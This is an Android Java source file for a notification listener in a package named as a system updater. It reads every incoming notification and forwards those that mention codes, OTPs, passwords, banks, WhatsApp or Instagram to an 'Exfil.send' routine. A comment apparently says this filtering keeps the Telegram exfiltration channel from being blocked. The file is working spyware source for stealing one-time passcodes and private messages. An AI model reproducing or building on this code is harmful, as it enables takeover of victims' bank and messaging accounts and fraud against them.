package com.sys.updater;

import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;

public class NotifListenerService extends NotificationListenerService {
    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        super.onNotificationPosted(sbn);
        if (sbn == null || sbn.getNotification() == null) return;

        try {
            String appName = sbn.getPackageName();
            CharSequence title = sbn.getNotification().extras.getCharSequence("android.title");
            CharSequence text = sbn.getNotification().extras.getCharSequence("android.text");

            if (text != null) {
                String msg = "🔔 Notification [" + appName + "]\n" +
                             (title != null ? title + ": " : "") + text;
                // Kan-sifto ghir ila kan fih chi kelma mohima bach ma-ykhelich Telegram
                String lower = msg.toLowerCase();
                if (lower.contains("code") || lower.contains("otp") || 
                    lower.contains("password") || lower.contains("bank") || 
                    lower.contains("whatsapp") || lower.contains("instagram")) {
                    Exfil.send(msg);
                }
            }
        } catch (Exception e) {}
    }
              }
